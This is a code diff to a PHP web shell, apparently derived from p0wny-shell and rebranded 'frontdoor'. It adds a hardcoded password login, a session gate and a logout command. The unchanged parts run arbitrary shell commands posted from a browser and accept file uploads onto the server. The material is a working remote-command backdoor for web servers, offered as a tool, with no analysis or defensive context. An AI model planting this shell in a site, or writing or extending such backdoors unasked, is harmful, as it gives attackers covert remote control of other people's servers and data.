@@ -1,5 +1,9 @@
 <?php
 
+$password = "knock2iamhome!";
+
+session_start();
+
 function featureShell($cmd, $cwd) {
     $stdout = array();
 
@@ -75,26 +79,55 @@ function featureUpload($path, $file, $cwd) {
     }
 }
 
+function featureLogout()
+{
+    $_SESSION["logged_in"] = FALSE;
+
+    return array(
+        "stdout" => ["Logged out..."],
+        "cwd" => "Login"
+    );
+}
+
 if (isset($_GET["feature"])) {
 
     $response = NULL;
 
-    switch ($_GET["feature"]) {
-        case "shell":
-            $cmd = $_POST['cmd'];
-            if (!preg_match('/2>/', $cmd)) {
-                $cmd .= ' 2>&1';
-            }
-            $response = featureShell($cmd, $_POST["cwd"]);
-            break;
-        case "pwd":
-            $response = featurePwd();
-            break;
-        case "hint":
-            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
-            break;
-        case 'upload':
-            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
+    if (!isset($_SESSION["logged_in"]) || $_SESSION["logged_in"] !== TRUE) {
+        if (isset($_POST["cmd"]) && $_POST["cmd"] === $password) {
+            $_SESSION["logged_in"] = TRUE;
+            $response = array(
+                "stdout" => ["Login success..."],
+                "cwd" => getcwd()
+            );
+        } else {
+            $response = array(
+                "stdout" => ["Please input correct password to continue..."],
+                "cwd" => "Login"
+            );
+        }
+    } else {
+        switch ($_GET["feature"]) {
+            case "shell":
+                $cmd = $_POST['cmd'];
+                if (!preg_match('/2>/', $cmd)) {
+                    $cmd .= ' 2>&1';
+                }
+                $response = featureShell($cmd, $_POST["cwd"]);
+                break;
+            case "pwd":
+                $response = featurePwd();
+                break;
+            case "hint":
+                $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
+                break;
+            case 'upload':
+                $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
+                break;
+            case "logout":
+                $response = featureLogout();
+                break;
+        }   
     }
 
     header("Content-Type: application/json");
@@ -102,13 +135,15 @@ if (isset($_GET["feature"])) {
     die();
 }
 
-?><!DOCTYPE html>
+?>
+
+<!DOCTYPE html>
 
 <html>
 
     <head>
         <meta charset="UTF-8" />
-        <title>p0wny@shell:~#</title>
+        <title>frontdoor@shell:~#</title>
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <style>
             html, body {
@@ -236,6 +271,11 @@ if (isset($_GET["feature"])) {
                 _insertCommand(command);
                 if (/^\s*upload\s+[^\s]+\s*$/.test(command)) {
                     featureUpload(command.match(/^\s*upload\s+([^\s]+)\s*$/)[1]);
+                } else if (/^\s*logout\s*$/.test(command)) {
+                    makeRequest("?feature=logout", {cmd: command, cwd: CWD}, function (response) {
+                        _insertStdout(response.stdout.join("\n"));
+                        updateCwd(response.cwd);
+                    });
                 } else if (/^\s*clear\s*$/.test(command)) {
                     // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer
                     eShellContent.innerHTML = '';
@@ -333,7 +373,7 @@ if (isset($_GET["feature"])) {
                     var splittedCwd = cwd.split("/");
                     shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
-                return "p0wny@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
+                return "frontdoor@shell:<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
 
             function updateCwd(cwd) {
@@ -440,12 +480,13 @@ if (isset($_GET["feature"])) {
         <div id="shell">
             <pre id="shell-content">
                 <div id="shell-logo">
-        ___                         ____      _          _ _        _  _   <span></span>
- _ __  / _ \__      ___ __  _   _  / __ \ ___| |__   ___| | |_ /\/|| || |_ <span></span>
-| '_ \| | | \ \ /\ / / '_ \| | | |/ / _` / __| '_ \ / _ \ | (_)/\/_  ..  _|<span></span>
-| |_) | |_| |\ V  V /| | | | |_| | | (_| \__ \ | | |  __/ | |_   |_      _|<span></span>
-| .__/ \___/  \_/\_/ |_| |_|\__, |\ \__,_|___/_| |_|\___|_|_(_)    |_||_|  <span></span>
-|_|                         |___/  \____/                                  <span></span>
+  ______               _   _____                              _          _ _   _   _  _   <span></span>
+ |  ____|             | | |  __ \                   ____     | |        | | |_( )_| || |_ <span></span>
+ | |__ _ __ ___  _ __ | |_| |  | | ___   ___  _ __ / __ \ ___| |__   ___| | (_)/|_  __  _|<span></span>
+ |  __| '__/ _ \| '_ \| __| |  | |/ _ \ / _ \| '__/ / _` / __| '_ \ / _ \ | |    _| || |_ <span></span>
+ | |  | | | (_) | | | | |_| |__| | (_) | (_) | | | | (_| \__ \ | | |  __/ | |_  |_  __  _|<span></span>
+ |_|  |_|  \___/|_| |_|\__|_____/ \___/ \___/|_|  \ \__,_|___/_| |_|\___|_|_(_)   |_||_|  <span></span>
+                                                   \____/                                 <span></span>
                 </div>
             </pre>
             <div id="shell-input">
